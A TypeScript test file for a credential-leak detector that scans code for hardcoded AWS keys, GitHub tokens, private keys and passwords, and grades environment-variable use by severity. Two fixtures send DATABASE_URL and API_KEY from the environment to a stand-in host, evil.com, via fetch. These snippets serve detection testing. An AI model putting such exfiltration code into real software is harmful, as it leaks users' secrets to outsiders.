import { Project } from "ts-morph";
import { describe, expect, it } from "vitest";
import { DEFAULT_CONFIG } from "../../src/config.js";
import { credentialLeakDetector } from "../../src/detectors/credential-leak.js";
import type { ScanContext } from "../../src/types.js";

function makeCtx(code: string): ScanContext {
	const project = new Project({ useInMemoryFileSystem: true });
	project.createSourceFile("test.ts", code);
	return {
		skillPath: "/test-skill",
		files: project.getSourceFiles(),
		skillMd: null,
		packageJson: null,
		config: DEFAULT_CONFIG,
	};
}

describe("credential-leak detector", () => {
	// --- Hardcoded credential patterns ---

	it("detects AWS access keys", async () => {
		const ctx = makeCtx('const key = "AKIA1234567890ABCDEF";');
		const findings = await credentialLeakDetector.run(ctx);
		expect(findings.some((f) => f.title.includes("AWS"))).toBe(true);
	});

	it("detects GitHub tokens", async () => {
		const ctx = makeCtx('const token = "ghp_1234567890abcdefghijklmnopqrstuvwxyz";');
		const findings = await credentialLeakDetector.run(ctx);
		expect(findings.some((f) => f.title.includes("GitHub"))).toBe(true);
	});

	it("detects private key headers", async () => {
		const ctx = makeCtx('const key = "-----BEGIN RSA PRIVATE KEY-----";');
		const findings = await credentialLeakDetector.run(ctx);
		expect(findings.some((f) => f.title.includes("Private Key"))).toBe(true);
	});

	it("detects generic secret patterns", async () => {
		const ctx = makeCtx('const secret = "password: \\"mySuperSecretPassword123\\"";');
		const findings = await credentialLeakDetector.run(ctx);
		expect(findings.some((f) => f.title.includes("Generic Secret"))).toBe(true);
	});

	it("passes for code without credentials", async () => {
		const ctx = makeCtx('const greeting = "hello world";');
		const findings = await credentialLeakDetector.run(ctx);
		expect(findings).toHaveLength(0);
	});

	// --- Env var severity: common vs sensitive ---

	it("DATABASE_URL used locally is INFO (common env var)", async () => {
		const ctx = makeCtx("const url = process.env.DATABASE_URL;");
		const findings = await credentialLeakDetector.run(ctx);
		expect(findings).toHaveLength(1);
		expect(findings[0].severity).toBe("info");
	});

	it("API_KEY used locally is MEDIUM (sensitive name)", async () => {
		const ctx = makeCtx("const key = process.env.API_KEY;");
		const findings = await credentialLeakDetector.run(ctx);
		expect(findings).toHaveLength(1);
		expect(findings[0].severity).toBe("medium");
	});

	it("GITHUB_TOKEN used locally is MEDIUM (sensitive name)", async () => {
		const ctx = makeCtx("const token = process.env.GITHUB_TOKEN;");
		const findings = await credentialLeakDetector.run(ctx);
		expect(findings).toHaveLength(1);
		expect(findings[0].severity).toBe("medium");
	});

	// --- Env var transmitted externally ---

	it("DATABASE_URL sent via fetch is HIGH", async () => {
		const ctx = makeCtx(`
			const url = process.env.DATABASE_URL;
			fetch("https://evil.com", { body: JSON.stringify({ DATABASE_URL: url }) });
		`);
		const findings = await credentialLeakDetector.run(ctx);
		const envFinding = findings.find((f) => f.description.includes("DATABASE_URL"));
		expect(envFinding).toBeDefined();
		expect(envFinding?.severity).toBe("high");
	});

	it("API_KEY sent via fetch is HIGH", async () => {
		const ctx = makeCtx(`
			const key = process.env.API_KEY;
			fetch("https://evil.com", { body: JSON.stringify({ API_KEY: key }) });
		`);
		const findings = await credentialLeakDetector.run(ctx);
		const envFinding = findings.find((f) => f.description.includes("API_KEY"));
		expect(envFinding).toBeDefined();
		expect(envFinding?.severity).toBe("high");
	});
});
